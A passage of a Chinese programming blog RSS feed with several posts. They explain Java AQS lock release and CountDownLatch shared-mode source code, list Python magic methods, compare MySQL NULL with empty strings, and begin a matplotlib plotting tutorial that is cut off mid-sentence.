&lt;p&gt;释放锁的方法是写在父类，&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;类中的。&lt;br/&gt;源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 释放独占模式下的锁资源
public final boolean release(int arg) {
    if (tryRelease(arg)) { // 尝试释放资源
        Node h = head;
  //释放成功后，判断头节点的状态是否为无锁状态，如果不为无锁状态就将头节点中的线程唤醒。
        if (h != null &amp;amp;&amp;amp; h.waitStatus != 0)
            unparkSuccessor(h);
        return true;
    }
    return false; // 释放资源失败，直接返回false
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们首先释放资源来看&lt;code&gt;tryRelease()&lt;/code&gt;方法的源码，看看释放资源是怎样的过程。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final boolean tryRelease(int releases) {
// 从state中减去传入参数的相应值（一般为1）
    int c = getState() - releases;
    // 当释放资源的线程与独占锁现有线程不一致时，非法线程释放，直接抛出异常。
    if (Thread.currentThread() != getExclusiveOwnerThread())
        throw new IllegalMonitorStateException();
    boolean free = false;
    // 这里是处理重入锁的机制，因为可重入机制，所以每次都重入state值都加1，
    //所以在释放的时候也要相应的减1，直到state的值为0才算完全的释放锁资源。
    if (c == 0) {
        free = true;
        // 完全释放资源后，将独占线程设置为null,这样后面的竞争线程才有可能抢占。
        setExclusiveOwnerThread(null);
    }
    // 重新赋值state
    setState(c);
    return free;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;tryRelease()&lt;/code&gt;方法在释放锁资源时，可以单纯的理解为是修改独占模式的状态值和置空占有线程的操作。将&lt;code&gt;state&lt;/code&gt;的值减掉相应的参数值（一般是1），如果计算结果为0，就将他的独占线程设置为&lt;code&gt;null&lt;/code&gt;，其他线程才有机会抢占成功。&lt;br/&gt;在加锁时，同一线程加一次锁，&lt;code&gt;state&lt;/code&gt;状态值就会加1，在解锁的时候没解锁一次就会减1，同一个锁可重入，只有&lt;code&gt;lock&lt;/code&gt;次数与&lt;code&gt;unlock&lt;/code&gt;次数相同才会释放资源，将独占线程设置为null。&lt;/p&gt;
&lt;p&gt;释放了资源后，我们再看唤醒挂起线程时的过程。这个过程就在&lt;code&gt;unparkSuccessor()&lt;/code&gt;方法中。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void unparkSuccessor(Node node) {
    /* 获取当前节点的等待状态，一般是头节点，占有锁的节点是在头节点上。 */
    int ws = node.waitStatus;
    // 将当前节点的线程的状态值设为0，成为无锁状态。
    if (ws &amp;lt; 0)
        compareAndSetWaitStatus(node, ws, 0);
    /*
     * Thread to unpark is held in successor, which is normally
     * just the next node.  But if cancelled or apparently null,
     * traverse backwards from tail to find the actual
     * non-cancelled successor.
     */
    Node s = node.next;// 获取下一个需要唤醒的节点线程。
    if (s == null || s.waitStatus &amp;gt; 0) {// 如果获取到的节点线程为空或已经取消
        s = null;
        // 就从队列的后面向前找，直到找到一个未取消的节点。
        for (Node t = tail; t != null &amp;amp;&amp;amp; t != node; t = t.prev)
            if (t.waitStatus &amp;lt;= 0)
                s = t;
    }
    if (s != null) // 如果获得的下一个可以唤醒的节点线程不为空，那么就唤醒它。
        LockSupport.unpark(s.thread);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个释放过程就是将需要释放的线程节点设置成无锁状态，然后去队列中找到可以唤醒的节点，进行唤醒线程。&lt;br/&gt;&lt;strong&gt;有一点需要解释一下，就是在寻找可以唤醒的节点时，为什么要从后向前找？&lt;/strong&gt;&lt;br/&gt;在上面&lt;code&gt;unparkSuccessor()&lt;/code&gt;方法的源码里面有一段英文注释（7行~12行），我保留了下来了。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;/*&lt;br/&gt;* Thread to unpark is held in successor, which is normally&lt;br/&gt;* just the next node. But if cancelled or apparently null,&lt;br/&gt;* traverse backwards from tail to find the actual&lt;br/&gt;* non-cancelled successor.&lt;br/&gt;*/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这段英文注释翻译过来的大概意思就是：线&lt;strong&gt;程唤醒的时候，通常是从当前线程的下个节点线程开始寻找，但是下个节点有可能已经取消了或者为null了，所以从后向前找，直到找到一个非 取消状态的节点线程。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于文章篇幅太长了，我这次就先将独占模式的加锁和解锁的过程总结到这里，下一篇通过CountDownLatch的加锁和解锁过程来总结AQS在共享模式下过程。&lt;/p&gt;
&lt;h3 id=&quot;aqs共享模式分析&quot;&gt;AQS共享模式分析&lt;/h3&gt;
&lt;p&gt;其实AQS的共享模式总结起来感觉比独占模式稍微容易一些，只是说总结起来稍微容易哦。&lt;/p&gt;
&lt;h4 id=&quot;countdownlatch的获取共享资源的过程&quot;&gt;CountDownLatch的获取共享资源的过程&lt;/h4&gt;
&lt;p&gt;在使用CountDownLatch的时候，是先创建CountDownLatch对象，然后在每次执行完一个任务后，就执行一次countDown()方法。直到通过getCount()获取到的值为0时才算执行完，如果count值不为0可通过await()方法让主线程进行等待，知道所有任务都执行完成，count的值被设为0。&lt;br/&gt;那么我们先来看创建CountDownLatch的方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public CountDownLatch(int count) {
    if (count &amp;lt; 0) throw new IllegalArgumentException(&quot;count &amp;lt; 0&quot;);
    this.sync = new Sync(count);
}

private static final class Sync extends AbstractQueuedSynchronizer {
   private static final long serialVersionUID = 4982264981922014374L;
   Sync(int count) {
       setState(count);
   }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们看到创建CountDownLatch的过程，其实就是将count值赋值给state的过程。&lt;/p&gt;
&lt;p&gt;再来看await()方法的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void await() throws InterruptedException {
    sync.acquireSharedInterruptibly(1);// 等待可中断的获取共享资源的方法
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final void acquireSharedInterruptibly(int arg)
            throws InterruptedException {
    if (Thread.interrupted()) // 如果线程已经中断，直接抛出异常结束。
        throw new InterruptedException();
    if (tryAcquireShared(arg) &amp;lt; 0)// 尝试获取共享资源，获取失败后，自旋入队列
        doAcquireSharedInterruptibly(arg);// 可中断的入队列过程
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;整个await()的等待过程是，先尝试获取共享资源，获取成功则执行任务，获取失败，则调用方法自旋式进入等待队列。&lt;br/&gt;通过最初在介绍AQS的时候就说过 ，共享模式下是需要自己去实现tryAcquireShared()方法来获取共享资源的，那么我们看看CountDownLatch是如何实现获取共享资源的。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected int tryAcquireShared(int acquires) {
    return (getState() == 0) ? 1 : -1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;简单易懂，就一行代码，直接获取state值，等于0就是成功，不等于0就失败。&lt;/p&gt;
&lt;p&gt;那么获取资源失败后，doAcquireSharedInterruptibly()方法是如何入执行的呢。&lt;br/&gt;源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doAcquireSharedInterruptibly(int arg)
        throws InterruptedException {
    final Node node = addWaiter(Node.SHARED);// addWaiter()方法已经总结过了，这一步操作的目的就是将当前线程封装成节点加入队尾，并设置成共享模式。
    boolean failed = true;
    try {
        for (;;) {
            final Node p = node.predecessor();// 获取前级节点
            if (p == head) {
            // 如果前级节点是头节点，直接尝试获取共享资源。
                int r = tryAcquireShared(arg);
                if (r &amp;gt;= 0) {// 如果获取共享资源成功，将head节点指向自己
                    setHeadAndPropagate(node, r);
                    p.next = null; // help GC 将原head节点指向空，方便垃圾回收。
                    failed = false;
                    return;
                }
            }
            // 如果不是前级节点不是head节点，就根据前级节点状态，判断是否需要挂起线程。
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                throw new InterruptedException();
        }
    } finally {
        if (failed) // 如果执行失败，取消获取共享资源的操作。
            cancelAcquire(node);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的方法和独占模式下acquireQueued()方法很像，只是在设置头节点唤醒新线程的时候有所不同，在setHeadAndPropagate()方法里面。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void setHeadAndPropagate(Node node, int propagate) {
    Node h = head; // Record old head for check below
    setHead(node);
   // 如果在唤醒完下一个节点后，资源还有剩余，并且新唤醒的节点状态不为无效状态，就继续唤醒队列中的后面节点里的线程。
    if (propagate &amp;gt; 0 || h == null || h.waitStatus &amp;lt; 0 ||
        (h = head) == null || h.waitStatus &amp;lt; 0) {
        Node s = node.next;
        if (s == null || s.isShared())
            doReleaseShared();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;setHeadAndPropagate()这个方法名称翻译成中文是“设置头节点并传播”，其实就是在获取共享锁资源的时候，如果资源除了用于唤醒下一个节点后，还有剩余，就会用于唤醒后面的节点，直到资源被用完。这里充分体现共享模式的“&lt;strong&gt;共享&lt;/strong&gt;”。&lt;/p&gt;
&lt;h3 id=&quot;countdownlatch释放资源&quot;&gt;CountDownLatch释放资源&lt;/h3&gt;
&lt;p&gt;我们再来看countDown()方法是如何释放资源的。&lt;br/&gt;源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void countDown() {
    sync.releaseShared(1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;CountDownLatch中内部类Sync的releaseShared()方法，是使用的AQS的releaseShared()方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final boolean releaseShared(int arg) {
    if (tryReleaseShared(arg)) {// 尝试释放资源
        doReleaseShared();// 释放资源成功后，唤醒节点。
        return true;
    }
    return false;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;尝试释放资源方法tryReleaseShared()是AQS规定需要自己来实现的，CountDownLatch的实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected boolean tryReleaseShared(int releases) {
    // Decrement count; signal when transition to zero
    for (;;) {
        int c = getState();
        if (c == 0) // 若state为0，说明已经不需要释放资源了，直接返回false。
            return false;
        int nextc = c-1;
        if (compareAndSetState(c, nextc))// 真正的释放资源，是通过CAS的方式将state的值减1。
            return nextc == 0;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实主要的就是通过CAS的方式将state的值减1的操作。&lt;br/&gt;释放资源成功后，就到了唤醒节点的过程了，在doReleaseShared()方法中。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doReleaseShared() {
  for (;;) {
      Node h = head;
      if (h != null &amp;amp;&amp;amp; h != tail) {// 当头节点不为空，并且不等于尾节点时，从头开始唤醒。
          int ws = h.waitStatus;// 获取头节点的等待状态
          if (ws == Node.SIGNAL) {// 如果头节点状态为等待唤醒，那么将头节点的状态设置为无锁状态，若CAS设置节点状态失败，就自旋。
              if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))
                  continue;            // loop to recheck cases
              unparkSuccessor(h);// 唤醒头节点
          }// 如果head节点的状态已经为无锁状态了，那么将head节点状态设置为可以向下传播唤醒的状态（PROPAGATE）。
          else if (ws == 0 &amp;amp;&amp;amp;
                   !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))
              continue;                // loop on failed CAS
      }
      // 若在执行过程中，head节点发生的变化，直接跳出循环。
      if (h == head)                   // loop if head changed
          break;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，AQS的独占模式和共享模式，在获取共享资源和释放共享资源的过程，就总结完了。内容有点多，需要好好消化一下，能看到最后的也都厉害的人物，因为我自己在总结这部分内容的时候也是查阅了很多资料，看了很多源码，用了好几天的时间才自己总结明白，AQS到底是个什么东西，是怎么一个执行过程。&lt;/p&gt;
&lt;p&gt;其实AQS里面不只我上面总结的这些内容，里面比如还有Condition、以及可中断的获取资源（acquireInterruptibly【独占】、acquireSharedInterruptibly【共享】acquire()和acquireShared()在线程等待过程中都是忽略中断的），还有ReentrantLock是如何实现公平锁的（其实是在竞争资源时如果有新进入的线程，先判断队列中是否有节点，如果有直接插入队尾等待，按顺序获取资源）。&lt;/p&gt;
&lt;p&gt;通过总结了AQS，基于AQS实现的ReentrantLock、CountDownLatch、Semaphore等的源码基本上就能看懂了，甚至再上层的CyclicBarrier、CopyOnWriteArrayList我们通过看源码也能知道大概是一个什么过程了。&lt;/p&gt;
&lt;p&gt;最后，内容有点多，有写的不好的地方也欢迎指正（我要是能闹明白就改，不明白我也没法改😂）。&lt;/p&gt;
&lt;p&gt;参考资料：&lt;br/&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000017372067&quot;&gt;深入分析AQS实现原理&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/waterystone/p/4920797.html#&quot;&gt;Java并发之AQS详解&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/trsjgUFRrz40Simq2VKxTA&quot;&gt;我画了35张图就是为了让你深入 AQS&lt;/a&gt;&lt;br/&gt;《Java并发编程的艺术》&lt;/p&gt;
</description>
<pubDate>Wed, 30 Sep 2020 00:08:00 +0000</pubDate>
<dc:creator>纪莫</dc:creator>
<og:description>前言 在Java面试的时候，多线程相关的知识是躲不掉的，肯定会被问。我就被问到了AQS的知识，就直接了当的问，AQS知道是什么吧，来讲讲它是怎么实现的，以及哪些地方用到了它。当时自己确实没有讲好，所以</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jimoer/p/13747291.html</dc:identifier>
</item>
<item>
<title>python魔法函数 - 奥辰</title>
<link>http://www.cnblogs.com/chenhuabin/p/13752770.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenhuabin/p/13752770.html</guid>
<description>&lt;pre&gt;
['__class__',
 '__delattr__',
 '__dict__',
 '__dir__',
 '__doc__',
 '__eq__',
 '__format__',
 '__ge__',
 '__getattribute__',
 '__gt__',
 '__hash__',
 '__init__',
 '__init_subclass__',
 '__le__',
 '__lt__',
 '__module__',
 '__ne__',
 '__new__',
 '__reduce__',
 '__reduce_ex__',
 '__repr__',
 '__setattr__',
 '__sizeof__',
 '__str__',
 '__subclasshook__',
 '__weakref__',
 'company_name',
 'fun']
&lt;/pre&gt;</description>
<pubDate>Tue, 29 Sep 2020 23:29:00 +0000</pubDate>
<dc:creator>奥辰</dc:creator>
<og:description>魔法函数是指类内部以双下划线开头，并且以双下划线结尾的函数，在特定时刻，Python会自动调用这些函数。魔法函数不是通过继承等机制获得的，而是类一旦定义，Python内部机制自动会给类赋予这些特殊的函</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenhuabin/p/13752770.html</dc:identifier>
</item>
<item>
<title>mysql 空值（null）和空字符（''）的区别 - 钢铁侠的知识库</title>
<link>http://www.cnblogs.com/jiba/p/13752664.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jiba/p/13752664.html</guid>
<description>&lt;p&gt;日常开发中，一般都会涉及到数据库增删改查，那么不可避免会遇到Mysql中的NULL和空字符。&lt;br/&gt;空字符（''）和空值（null）表面上看都是空，其实存在一些差异：&lt;/p&gt;
&lt;h2 id=&quot;定义：&quot;&gt;定义：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;空值(NULL)的长度是NULL，不确定占用了多少存储空间，但是占用存储空间的&lt;/li&gt;
&lt;li&gt;空字符串('')的长度是0，是不占用空间的&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;通俗的讲：&lt;br/&gt;空字符串（''）就像是一个真空转态杯子，什么都没有。&lt;br/&gt;空值（NULL）就像是一个装满空气的杯子，含有东西。&lt;br/&gt;二者虽然看起来都是空的、透明的，但是有着本质的区别。&lt;/p&gt;
&lt;h2 id=&quot;区别：&quot;&gt;区别：&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;在进行count()统计某列时候，如果用null值系统会自动忽略掉，但是空字符会进行统计。&lt;br/&gt;不过count(*)会被优化，直接返回总行数，包括null值。&lt;/li&gt;
&lt;li&gt;判断null用&lt;code&gt;is null&lt;/code&gt;或&lt;code&gt;is not null&lt;/code&gt;，SQL可以使用&lt;code&gt;ifnull()&lt;/code&gt;函数进行处理；判断空字符用&lt;code&gt;=''&lt;/code&gt;或者&lt;code&gt;!=''&lt;/code&gt;进行处理。&lt;/li&gt;
&lt;li&gt;对于timestamp数据类型，插入null值会是当前系统时间；插入空字符，则出现&lt;code&gt;0000-00-00 00:00:00&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;实例：&quot;&gt;实例：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;新建一张表test_ab，并插入4行数据。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;CREATE TABLE test_ab (id int,
        col_a varchar(128),
        col_b varchar(128) not null
);

insert test_ab(id,col_a,col_b) values(1,1,1);
insert test_ab(id,col_a,col_b) values(2,'','');
insert test_ab(id,col_a,col_b) values(3,null,'');
insert test_ab(id,col_a,col_b) values(4,null,1);

mysql&amp;gt; select * from test_ab;
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    1 | 1     | 1     |
|    2 |       |       |
|    3 | NULL  |       |
|    4 | NULL  | 1     |
+------+-------+-------+
4 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;首先比较一下，空字符（''）和空值（null）查询方式的不同：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select * from test_ab where col_a = '';
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    2 |       |       |
+------+-------+-------+
1 row in set (0.00 sec)

mysql&amp;gt; select * from test_ab where col_a is null;
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    3 | NULL  |       |
|    4 | NULL  | 1     |
+------+-------+-------+
2 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由此可见，&lt;code&gt;null&lt;/code&gt;和&lt;code&gt;''&lt;/code&gt;的查询方式不同。而且比较字符 ‘=’’&amp;gt;’ ‘&amp;lt;’ ‘&amp;lt;&amp;gt;’不能用于查询null，&lt;br/&gt;如果需要查询空值（null），需使用is null 和is not null。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第二种比较，参与运算&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select col_a+1 from test_ab where id = 4;
+---------+
| col_a+1 |
+---------+
|    NULL |
+---------+
1 row in set (0.00 sec)

mysql&amp;gt; select col_b+1 from test_ab where id = 4;
+---------+
| col_b+1 |
+---------+
|       2 |
+---------+
1 row in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由此可见，空值（null）不能参与任何计算，因为空值参与任何计算都为空。&lt;br/&gt;所以，当程序业务中存在计算的时候，需要特别注意。&lt;br/&gt;如果非要参与计算，需使用ifnull函数，将null转换为&lt;code&gt;''&lt;/code&gt;才能正常计算。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第三种比较，统计数量&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select count(col_a) from test_ab;
+--------------+
| count(col_a) |
+--------------+
|            2 |
+--------------+
1 row in set (0.00 sec)

mysql&amp;gt; select count(col_b) from test_ab;
+--------------+
| count(col_b) |
+--------------+
|            4 |
+--------------+
1 row in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由此可见，当统计数量的时候。空值（null）并不会被当成有效值去统计。&lt;br/&gt;同理，sum()求和的时候，null也不会被统计进来，这样就能理解，&lt;br/&gt;为什么null计算的时候结果为空，而sum()求和的时候结果正常了。&lt;/p&gt;
&lt;h2 id=&quot;结论：&quot;&gt;结论：&lt;/h2&gt;
&lt;p&gt;所以在设置默认值的时候，尽量不要用null当默认值，如果字段是int类型，默认为0；如果是varchar类型，默认值用空字符串（''）会更好一些。带有null的默认值还是可以走索引的，只是会影响效率。当然，如果确认该字段不会用到索引的话，也是可以设置为null的。&lt;/p&gt;
&lt;p&gt;在设置字段的时候，可以给字段设置为 not null ，因为 not null 这个概念和默认值是不冲突的。我们在设置默认值为（''）的时候，虽然避免了null的情况，但是可能存在直接给字段赋值为null，这样数据库中还是会出现null的情况，所以强烈建议都给字段加上 not null。&lt;/p&gt;
&lt;p&gt;类似这样的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; alter table test_ab modify `col_b` varchar(128) NOT NULL DEFAULT '';
Query OK, 0 rows affected (0.00 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; desc test_ab;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| id    | int          | YES  |     | NULL    |       |
| col_a | varchar(128) | YES  |     | NULL    |       |
| col_b | varchar(128) | NO   |     |         |       |
+-------+--------------+------+-----+---------+-------+
3 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;尽管在存储空间上，在索引性能上可能并不比空字符差，但是为了避免其身上特殊性，给项目带来不确定因素，因此建议默认值不要使用 NULL。&lt;/p&gt;
&lt;p&gt;----by 钢铁 648403020@qq.com 09.30.2020&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 17:43:00 +0000</pubDate>
<dc:creator>钢铁侠的知识库</dc:creator>
<og:description>日常开发中，一般都会涉及到数据库增删改查，那么不可避免会遇到Mysql中的NULL和空字符。 空字符（&amp;amp;#39;&amp;amp;#39;）和空值（null）表面上看都是空，其实存在一些差异： 定义：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jiba/p/13752664.html</dc:identifier>
</item>
<item>
<title>数据分析与挖掘 - 08图形绘制 - 马一特</title>
<link>http://www.cnblogs.com/mayite/p/13752591.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mayite/p/13752591.html</guid>
<description>&lt;h3 id=&quot;一-图的基本构成&quot;&gt;一 图的基本构成&lt;/h3&gt;
&lt;p&gt;Matplotlib是数据可视化工作中，最常用的一个可视化库。Matplotlib有非常多的图形，我们很难在短时间内将其掌握，所以我们首先要掌握的是画图的思路和常用的一些图形。创建一个图的步骤大致可以分为9步，当然这9步并不是每一次都需要，只要你知道一个完整的图形可以有这么多的步骤就可以。每一个步骤对应着一个操作和操作它的函数。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;导入模块：import matplotlib.pyplot as plt&lt;/li&gt;
&lt;li&gt;定义图像窗口：plt.figure()&lt;/li&gt;
&lt;li&gt;画图：plt.plot(x, y)&lt;/li&gt;
&lt;li&gt;定义坐标轴范围：x轴:plt.xlim()/y轴:plt.ylim() lim其实就是limit的缩写&lt;/li&gt;
&lt;li&gt;定义坐标轴名称：x轴:plt.xlabel()/plt.ylabel()&lt;/li&gt;
&lt;li&gt;定义坐标轴刻度及名称：plt.xticks()/plt.yticks()&lt;/li&gt;
&lt;li&gt;设置图像边框颜色：ax = plt.gca() ax.spines[].set_color()&lt;/li&gt;
&lt;li&gt;调整刻度位置：ax.xaxis.set_ticks_position()/ax.yaxis.set_ticks_position()&lt;/li&gt;
&lt;li&gt;调整边框（坐标轴）位置：ax.spines[].set_position()&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;br/&gt;下面请跟随我的代码一起来画一个图感受一下吧！&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspace将会在-5到5的区间内生成100个数，注意这个是均匀分布的
x = np.linspace(-5, 5, 100)

# 根据x的值，经过计算生成y1和y2的值
y1 = 2 * x + 1
y2 = x ** 2

# 画图
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# 显示
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样我们就画出来一个简单的图形了，接下来我们继续在刚刚画的这个图形中添加一些元素。我们要做的事情就是重新定义坐标轴的名称，在定义坐标轴的名称的时候，我们会遇到一个问题，就是中文显示 的问题，这个问题是绕不过去的问题。&lt;/p&gt;&lt;p&gt;对于Windows系统的同学只需在代码中添加如下代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;# 解决中文显示问题
font = {&quot;family&quot; : &quot;SimHei&quot;,
 &quot;size&quot; : &quot;20&quot;}
plt.rc(&quot;font&quot;, **font)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于mac系统的同学来说，稍微有点麻烦，在terminal里面输入：fc-list :lang=zh，如果显示command not found，那么我们需要执行一个安装命令：conda install fontconfig，然后输入y确认就可以自动安装好了，最后再一次输入fc-list :lang=zh，就可以查看字体了，然后我们在代码中添加下面一行代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面让我们一起来把这个绘图完善起来，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspace将会在-5到5的区间内生成100个数，注意这个是均匀分布的
x = np.linspace(-5, 5, 100)

# 根据x的值，经过计算生成y1和y2的值
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 设置画布大小
plt.figure(figsize=(8, 5))

# 画图
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# 设置坐标轴范围
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# 设置坐标轴名称
plt.xlabel('我是x轴')
plt.ylabel('我是y轴')

# 显示
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们看到，在坐标轴上还会有一些刻度的存在，我们只需要在上边的代码后边加入一段代码，就可以进行刻度的修改了：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;new_ticks = np.linspace(-1, 2, 5)
# 设置坐标轴的刻度
plt.xticks(new_ticks)
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;北京&quot;, &quot;天津&quot;, &quot;河北&quot;, &quot;东北&quot;, &quot;山东&quot;])
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;除此之外，我们还可以做一些图形边框上的修改，在本章最开始我们已经说过关于图形边框修改的方法了，我们只需要把下面的代码添加至末尾即可：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;# 添加边框
ax = plt.gca()
# 修改右侧颜色
ax.spines[&quot;right&quot;].set_color(&quot;green&quot;)
# 修改左侧颜色
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# 修改顶部颜色
ax.spines[&quot;top&quot;].set_color(&quot;yellow&quot;)
# 修改底部颜色
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一起来看一下现实的效果怎么样&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600795840052-451d2044-2e81-4220-bd49-f3db3c026be3.png#align=left&amp;amp;display=inline&amp;amp;height=459&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=918&amp;amp;originWidth=1436&amp;amp;size=93178&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;这里需要注意的是，如果上下左右只操作其中的左侧和底部，那么其他两条线将仍然默认是黑色,还有另外一个小技巧，我们上面的图形总是在一个方框中显示，我们可以把右侧和顶部的线条不设置颜色，这样看起来就与我们平时的坐标轴看起来一个样子了，也就是把设置边框的代码修改为：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改之后看起来就好多了&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600796029534-8ec0c9c9-5c11-4bd2-8ccf-39347252b6a3.png#align=left&amp;amp;display=inline&amp;amp;height=460&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=920&amp;amp;originWidth=1432&amp;amp;size=86599&amp;amp;status=done&amp;amp;style=none&amp;amp;width=716&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;在数学中，我们的图形有时是十字的样式，那下面我们一起来看一下，如何修改边框的位置，代码其实也很简单，我们首先来修改一下x轴对应y轴的位置，完整的代码如下：&lt;/p&gt;
